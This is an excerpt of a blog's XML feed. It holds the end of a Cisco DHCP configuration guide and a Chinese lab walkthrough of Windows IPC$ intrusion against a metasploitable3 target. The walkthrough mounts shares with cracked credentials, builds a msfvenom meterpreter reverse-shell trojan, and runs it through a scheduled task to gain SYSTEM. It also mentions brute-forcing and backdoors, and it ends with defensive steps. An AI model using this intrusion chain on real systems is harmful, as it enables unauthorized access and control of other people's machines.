-ip add 10.1.1.1 255.255.255.0
-service dhcp
-ip dhcp exc 172.16.1.253 172.16.1.254
-ip dhcp exc 172.16.2.253 172.16.2.254
-ip dhcp pool net1
-network 172.16.1.0 255.255.255.0
-default-router 172.16.1.254
-dns-server 10.1.2.1
-exit
-ip dhcp pool net2
-network 172.16.2.0 255.255.255.0
-default-router 172.16.2.254
-dns-server 10.1.2.1
-exit
-ip route 172.16.2.0 255.255.255.0 10.1.1.2
-ip routing</code></pre><h5 id="DHCP中继"><a href="#DHCP中继" class="headerlink" title="DHCP中继"></a>DHCP中继</h5><p>sw2</p>
-<pre><code>en
-config
-int f0/23
-no sw
-ip add 10.1.1.2 255.255.255.0
-int f0/1
-no sw
-ip add 172.16.2.254 255.255.255.0
-exit
-service dhcp
-int f0/1
-ip helper 10.1.1.1
-exit
-ip routing
-ip route 172.16.1.0 255.255.255.0 10.1.1.1</code></pre><h5 id="DHCP监听"><a href="#DHCP监听" class="headerlink" title="DHCP监听"></a>DHCP监听</h5><p>sw3</p>
-<pre><code>en
-config
-ip dhcp snooping
-int f0/1
-ip dhcp snooping trust</code></pre><p>sw4</p>
-<pre><code>en
-config
-ip dhcp snooping
-int f0/1
-ip dhcp snooping trust</code></pre>]]></content>
-      <categories>
-        <category>网络搭建</category>
-      </categories>
-      <tags>
-        <tag>收录</tag>
-        <tag>网络搭建</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ipc$命令管道入侵示例</title>
-    <url>/2020/06/26/ipc$/</url>
-    <content><![CDATA[<h2 id="IPC-入侵示例"><a href="#IPC-入侵示例" class="headerlink" title="IPC$入侵示例"></a>IPC$入侵示例</h2><blockquote>
-<p>IPC$(Internet Process Connection) 是共享 “ 命名管道 “ 的资源，它是为了让<a href="https://baike.baidu.com/item/进程间通信" target="_blank" rel="noopener">进程间通信</a>而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。 IPC$ 是 NT/2000 的一项新功能，它有一个特点，即在同一时间内，两个 IP 之间只允许建立一个连接。 NT/2000 在提供了  ipc$ 功能的同时，在初次<a href="https://baike.baidu.com/item/安装系统" target="_blank" rel="noopener">安装系统</a>时还打开了<a href="https://baike.baidu.com/item/默认共享" target="_blank" rel="noopener">默认共享</a>，即所有的逻辑共享 (c$,d$,e$ …… ) 和系统目录 winnt 或 windows(admin$) 共享。所有的这些，微软的初衷都是为了方便管理员的管理，但在有意无意中，导致了系统安全性的降低。</p>
-</blockquote>
-<p>入侵条件：<strong>拥有对方机器的用户名和密码</strong></p>
-<p>关于破解用户名密码等请参考文章，<strong>这里不再赘述</strong>！</p>
-<p>但是因为ipc$的dos命令登录特殊性，<strong>你甚至可以编写批处理进行暴力破解！</strong></p>
-<p>渗透机：Kali Linux 2019.3版本   WindowsXP</p>
-<p>靶机：metasploitable3-win2k8</p>
-<pre><code>net use \\目标ip\ipc$ 用户密码 /user:用户名   建立空连接
-net use z: \\目标ip\c$ 用户密码 /user:用户名  将对方的C盘映射到自己的Z盘中
-net use \\目标IP\ipc$ /del                  删除一个ipc$连接
-net use z: /del                            删除映射的z盘
-//这些都是DOS命令</code></pre><p>这里在破解到该用户的登录密码后，开始尝试建立空连接</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--1.png" alt></p>
-<p>成功建立了空连接</p>
-<p>这里尝试对对方的磁盘进行映射</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--2.png" alt></p>
-<p>这里看到，对方的C盘已经映射到左下角的Z盘里了</p>
-<p>这里可以轻易访问\读写对方的磁盘</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--3.png" alt></p>
-<h4 id="已经建立了空连接，开始上传木马"><a href="#已经建立了空连接，开始上传木马" class="headerlink" title="已经建立了空连接，开始上传木马"></a><strong>已经建立了空连接，开始上传木马</strong></h4><p>这里利用Kali Linux中Metasploitble生成一个木马文件</p>
-<pre><code>msfvenom -p windows/meterpreter/reverse_tcp -i 5 -b &apos;0x00&apos; LHOST=渗透机IP    LPORT=渗透机监听端口 -f exe &gt; 木马名.exe   生成木马
-use exploit/multi/handler   定义监听攻击模块
-set payloads windows/meterpreter/reverset_tcp   设置payload
-set lhost IP    设置渗透机ip
-set lport 端口    设置渗透机监听端口
-exploit   开始监听</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--4.png" alt></p>
-<blockquote>
-<p>如果出现问题请仔细看上图</p>
-</blockquote>
-<p>完成创建，木马默认生成在Kali的根目录下</p>
-<h4 id="开始上传木马"><a href="#开始上传木马" class="headerlink" title="开始上传木马"></a>开始上传木马</h4><pre><code>copy 本地路径 目标粘贴路径   向对方复制文件</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--5.png" alt></p>
-<p>这里已经成功把生成的木马文件复制到了目标机器上</p>
-<pre><code>at \\目标IP 时间(24h制) 路径   添加计划任务
-at \\目标IP   查看计划任务表</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--6.png" alt></p>
-<p>这里向目标机器添加了计划任务，意思就是2分钟后执行C:\system.exe</p>
-<p>at \目标ip  可以验证计划任务添加情况</p>
-<blockquote>
-<p>这里的时间最好不要设置太近，否则系统会认为是明天的这个时间</p>
-</blockquote>
-<p><strong>2</strong></p>
-<p><strong>分</strong></p>
-<p><strong>钟</strong></p>
-<p><strong>后</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--7.png" alt></p>
-<p>这里可以看到，原在Kali内持续监听的msf已经连接上对应的shell了</p>
-<p>输入shell进入   这里whoami已经看到  拿到了<strong>最高system权限</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--8.png" alt></p>
-<p><strong>当然！建立空连接后上传木马也好，后门开端口也好，方法大同小异</strong></p>
-<p><strong>这里拿到最高权限已经可以准备开后门，留隐藏端口了</strong></p>
-<p>这里补充一点msf中本木马的一些相关命令，可以用的到</p>
-<pre><code>1.基本命令
-help                       查看Meterpreter帮助
-background                 返回，把meterpreter后台挂起
-bgkill                     杀死一个背景 meterpreter 脚本
-bglist                     提供所有正在运行的后台脚本的列表
-bgrun                      作为一个后台线程运行脚本
-channel                    显示活动频道
-sessions -i number         与会话进行交互
-close                      关闭通道
-exit                       终止 meterpreter 会话
-interact id                切换进一个信道
-read                       从通道读取数据
-write                      将数据写入到一个通道
-2.文件系统命令
-upload 本地路径 目标路径      上传文件
-download 目标路径 本地路径    下载文件到本机
-edit 目标路径                编辑文件
-enumdesktops               用户登录数
-//文件系统命令详见Linux基础命令篇</code></pre><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ol>
-<li><strong>本地cmd中输入net share</strong></li>
-</ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/6-27--9.png" alt></p>
-<p>然后有几个删几个！</p>
-<pre><code>net share ipc$ /delete
-net share admin$ /delete
-net share c$ /delete</code></pre><ol start="2">
-<li><p><strong>关闭ipc$和默认共享所依赖的:server服务</strong></p>
-<p>控制面板 - 管理工具 - 服务 - server服务 - 属性 - 常规 - 启动类型 - 禁用</p>
-</li>
-<li><p><strong>屏蔽139，445端口</strong></p>
-<p>方法很多，建议百度</p>
-</li>
-<li><p><strong>设置复杂的密码，防止密码被暴力破解</strong></p>
-</li>
-</ol>
-<p>参考文献：</p>
-<p><a href="https://blog.csdn.net/u010984552/article/details/54890187" target="_blank" rel="noopener">https://blog.csdn.net/u010984552/article/details/54890187</a></p>
 ]]></content>
       <categories>
         <category>网络空间安全</category>
